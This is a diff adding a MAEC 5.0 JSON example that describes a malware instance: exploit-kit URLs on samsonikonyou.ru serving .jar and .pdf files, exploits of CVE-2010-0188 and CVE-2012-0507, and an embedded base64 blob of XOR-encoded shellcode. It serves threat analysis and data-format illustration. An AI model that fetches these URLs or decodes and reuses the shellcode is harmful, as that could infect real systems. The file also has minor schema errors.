@@ -1,0 +1,142 @@
+{
+	"id":"maec-example-pkg-1",
+	"schema_version":"5.0",
+	"malware_instances":[
+		{
+			"id":"maec-example-instance-1",
+			"instance_object_ref":"instance-obj-1",
+			"capability_refs":[
+				"maec-tst-cpb-1"
+			],
+			"behavior_refs":[
+				"maec-example-bhv-1",
+				"maec-example-bhv-2"
+			],
+			"action_refs":[
+				"maec-example-act-1",
+				"maec-example-act-2",
+				"maec-example-act-3"
+			]
+		}
+	],
+	"cybox":{
+		"objects":{
+			"instance-obj-1":{
+				"type":"url",
+				"value":"http://samsonikonyou.ru:8080/navigator/jueoaritjuir.php"
+			},
+			"maec-example-obj-1":{
+				"type":"file",
+				"file_name":"xodmeqglxldnx.jar"
+			},
+			"maec-example-obj-2":{
+				"type":"url",
+				"value": "http://samsonikonyou.ru:8080/navigator/xodmeqglxldnx.jar"
+			},
+			"maec-example-obj-3":{
+				"type":"file",
+				"file_name":"krgobpevcpync.jar"
+			},
+			"maec-example-obj-4":{
+				"type":"url",
+				"file_name":"http://samsonikonyou.ru:8080/navigator/krgobpevcpync.jar"
+			},
+			"maec-example-obj-5":{
+				"type":"file",
+				"file_name":"aqcphscwgqhvkzy5.pdf",
+				"contains_refs":[
+					"maec-example-obj-7"
+				]
+			},
+			"maec-example-obj-7":{
+				"type":"artifact",
+				"description":"Purpose: Shellcode, Code Language: Assembly, xor_pattern=55AA55AA55AA55BB",
+				"payload_bin":"did7Q+eH3R9n67he0QGpKaTkiouTnrJnL0BwGOhfMtaxBxwZYl3lGOdRQA2lo5N9YYZSQLQNwNm/2VAMaqGtFmFPZzi/IjNep6jJOAa/Zob04PSUBG7I6ouWgunaARUAw5bX/4iwEOohY7dtp2iPD5u70CDrHil+GieKzKoEKlmBlKOKNBwZZaHTfau31rQxsrJA3kPdUveiBDiG/VzCgKB6/Z+sn8QAyqU1e+47DqdlQJYikWIOi8s19yB2HSeFXvam7F+vp/5RPajP1XMevsqsjZvBe7u+BBDqniiunMr9UogAj4U6vyS9AmYSPOozqLgv2YHPimKuWJkAkrUzG/ifG05zlJgnaoGKllReXMzOC+7+Ee44WtjgCFdu1xgcC6PGnHDiYuCPsfiuck+HJkeE/vZbYmZu0UlTHWD5DLpzSCK04YeRvcwxr+wlwE1JfgrGVsIRsirwhQwoe/9n6t401WemVdDcJBgbfgaBj4MU2Kj5SpXexfw2oTh7kH7xfVFqFgSgEuk5L9wzjjZxvh4dYqaPxRDbtOSeth3/5MoG7eBzCMPIl45uzpkCejHxcBJPT2ibVGQJPBHSqGi351USXOjDIUQyIgB/t4LcD3MBGC2GhXJXUjwf8BG1zfljX5BFWaV5MgKiiTrQP36YcvVYaqAq/Eh1EhCnRNnhTgtW5HPwLR1LFLn8IBywt+uW08jU8a6xieI3sgLN0NJYRnU4PNj1b6TR7l10veu1BZZkSEbj3FmJ4/jmtDGdH1t8ldJ3LqKOGgIXlpeyySA/PmjWRFXfPCUX1RUeXsLaE9X4Iqwd+kBxMMxDec5oT+HRZm0Bfh9Ui2HdI1GpSGEhcRHAoodVxibihtiT5bbuXhJ6RnivnbBbItlBFi9jQjSQsgD/Q2xNyQ/QbuVdxZ26XQbxeNrlJmA4ZyHiKYGHuNc5CdLF0iuLA2aRE3X2E/6iW7eZUZCfUie/wFn2iU3HVsdcJtL8aVtA2G9f8UwYCd29oLz7hvz89I29o7FXBjsSNeAvImz6D3IJ1Sc1aPxmwVYJuJ5DBoUMikdM1cudb68whXi/fI8Vk3gblXGKjgSxhGz8GmDYGfNLjf976FtZxsQ2P7yBxCc1pWGvTctsPmkxqi4ytqjBp5YuANqvxarRojXykr8vrErl7gCPyG1eNPiqhX5oN3hsYgKU8NA7Cy6WMVXCjMU3IspYY7McR4jzcSi0X0oTOMSsnRtuOvXVQE2Zysy0Q3JQ4OBOmxj8YcZChwOr1FyXsxwYIFYAyA9pZoxVE1Z4MgKWaXlV+yewgdlk/9WfxVDbrxmQml/rMGBmUczBNuIJmIGVFczK/uiEtmbdxKI6N07hUGJICKXix09PcfCEkuGu3IVuFlcQ+1DOplNDIru0fmv/ugZdrY7oohbV9ATfD3w="
+			},
+			"maec-example-obj-6":{
+				"type":"url",
+				"value":"http://samsonikonyou.ru:8080/navigator/aqcphscwgqhvkzy5.pdf"
+			}
+		}
+	},
+	"capabilities":[
+		{
+			"id":"maec-tst-cpb-1",
+			"name":"infection/propagation",
+			"refined_capabilities":[
+				{
+					"id":"maec-tst-obt-1",
+					"name":"remote machine infection"
+				}
+			]
+		}
+	],
+	"behaviors":[
+		{
+			"id":"maec-example-bhv-1",
+			"description":"A vulnerability exploit behavior initiated by some code on the web page.",
+			"attributes":[
+				{
+					"name":"vulnerability ID (CVE)",
+					"value":"CVE-2010-0188"
+				}
+			]
+		},
+		{
+			"id":"maec-example-bhv-2",
+			"description":"A vulnerability exploit behavior initiated by some code on the web page.",
+			"attributes":[
+				{
+					"name": "ulnerability ID (CVE)",
+					"value":"CVE-2012-0507"
+				}
+			]
+		}
+
+	],
+	"actions":[
+		{
+			"id":"maec-example-act-1",
+			"name":"download file",
+			"object_references":[
+				{
+					"obj_ref":"maec-example-obj-1",
+					"association_type":"output"
+				},
+				{
+					"obj_ref":"maec-example-obj-2",
+					"association_type":"input"
+				}
+			]
+		},
+		{
+			"id":"maec-example-act-2",
+			"name":"download file",
+			"object_references":[
+				{
+					"obj_ref":"maec-example-obj-3",
+					"association_type":"output"
+				},
+				{
+					"obj_ref":"maec-example-obj-4",
+					"association_type":"input"
+				}
+			]
+		},
+		{
+			"id":"maec-example-act-3",
+			"name":"download file",
+			"object_references":[
+				{
+					"obj_ref":"maec-example-obj-5",
+					"association_type":"output"
+				},
+				{
+					"obj_ref":"maec-example-obj-6",
+					"association_type":"input"
+				}
+			]
+
+		}
+	]
+	
